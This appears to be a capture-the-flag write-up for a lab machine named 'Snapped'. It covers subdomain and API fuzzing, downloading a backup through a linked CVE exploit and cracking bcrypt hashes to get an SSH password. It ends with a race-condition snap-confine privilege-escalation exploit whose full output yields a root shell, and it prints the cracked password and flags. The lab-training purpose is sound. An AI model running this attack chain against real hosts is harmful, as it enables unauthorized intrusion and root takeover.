
![[Pasted image 20260718104235.png]]


lets start with nmap :

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


simple setup , <mark style="background: #FF5582A6;">lets skip full scan</mark> 

http:
![[Pasted image 20260711155622.png]]

lets fuzzz dir/subdomain in bg , 

we have : contact@snapped.htb 

its an static website , fuzzing should give something , 

and we found :

```
 ffuf -w Desktop/wordlists/subdomain/subdomains-top1million-110000.txt -u http://snapped.htb/ -H 'Host: FUZZ.snapped.htb' -t 400 -fs 154            

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb/
 :: Wordlist         : FUZZ: /home/sawsage/Desktop/wordlists/subdomain/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 400
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 334ms]
```

lets see what it does offer,

![[Pasted image 20260711160341.png]]

login page , no default creds , no version info , lets fuzz in bg , and also nmap -p- , nothing , its using api  , fuzzing gave :

```
________________________________________________

 :: Method           : GET
 :: URL              : http://admin.snapped.htb/api/FUZZ
 :: Wordlist         : FUZZ: /home/sawsage/Desktop/wordlists/directories/objects.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 400
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

certs                   [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 296ms]
config                  [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 286ms]
configs                 [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 288ms]
events                  [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 291ms]
backup                  [Status: 200, Size: 18386, Words: 75, Lines: 65, Duration: 328ms]
install                 [Status: 200, Size: 29, Words: 1, Lines: 1, Duration: 287ms]
node                    [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 286ms]
settings                [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 287ms]
sites                   [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 285ms]
user                    [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 289ms]
users                   [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 290ms]
:: Progress: [3132/3132] :: Job [1/1] :: 1383 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

in this backup is intresting , which gives us a zip file , this is vaulnrable to : `CVE-2026-27944` [reference](https://github.com/advisories/GHSA-g9w5-qffc-6762) [Autoscript:](https://github.com/Aditya-k-Jangid/Scripts/blob/main/CVE-2026-27944.py) ) which gives us access to the sqlite file which contains 2 creds : 

```
admin                  $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
jonathan               $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

after cracking:

```
jonathan:$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

and this creds also work for the ssh , which then leads to user.txt

```
2c05f834631868bd45269a02bf0bfc60
```

## Priv_esc 

found locally running services:

```
Netid          State            Recv-Q           Send-Q                                        Local Address:Port                      Peer Address:Port          Process
udp            UNCONN           0                0                                                   0.0.0.0:5353                           0.0.0.0:*
udp            UNCONN           0                0                                                127.0.0.54:53                             0.0.0.0:*
udp            UNCONN           0                0                                             127.0.0.53%lo:53                             0.0.0.0:*
udp            UNCONN           0                0                                                   0.0.0.0:51255                          0.0.0.0:*
udp            UNCONN           0                0                                            10.129.117.114:68                             0.0.0.0:*
udp            UNCONN           0                0                          [dead:beef::df2f:4246:213d:517b]:546                               [::]:*
udp            UNCONN           0                0                          [fe80::5d7e:f673:ae37:a8d8]%eth0:546                               [::]:*
udp            UNCONN           0                0                                                      [::]:5353                              [::]:*
udp            UNCONN           0                0                                                      [::]:52808                             [::]:*
tcp            LISTEN           0                4096                                              127.0.0.1:9000                           0.0.0.0:*
tcp            LISTEN           0                4096                                             127.0.0.54:53                             0.0.0.0:*
tcp            LISTEN           0                4096                                          127.0.0.53%lo:53                             0.0.0.0:*
tcp            LISTEN           0                4096                                              127.0.0.1:631                            0.0.0.0:*
tcp            LISTEN           0                511                                                 0.0.0.0:80                             0.0.0.0:*
tcp            LISTEN           0                4096                                                0.0.0.0:22                             0.0.0.0:*
tcp            LISTEN           0                4096                                                  [::1]:631                               [::]:*
tcp            LISTEN           0                4096                                                   [::]:22                                [::]:*
```

lets check 631 which is running : OpenPrinting CUPS 2.4.7

and snap has a priv esc : # CVE-2026-3888 [script](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE) 

```
./exploit librootshell.so
================================================================
    CVE-2026-3888 ΓÇö snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/librootshell.so (9056 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 5639

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_gHaJX6//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/5639/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 6119)...

[!]   TRIGGER ΓÇö swapping directories...
[+]   SWAP DONE ΓÇö race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 6119

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script ΓåÆ /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine ΓåÆ snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# whoami
root
bash-5.1# cat /root/root.ttx
cat: /root/root.ttx: No such file or directory
bash-5.1# cat /root/root.txt
0c814af79e3ca1f84a9060526379ce8f
```
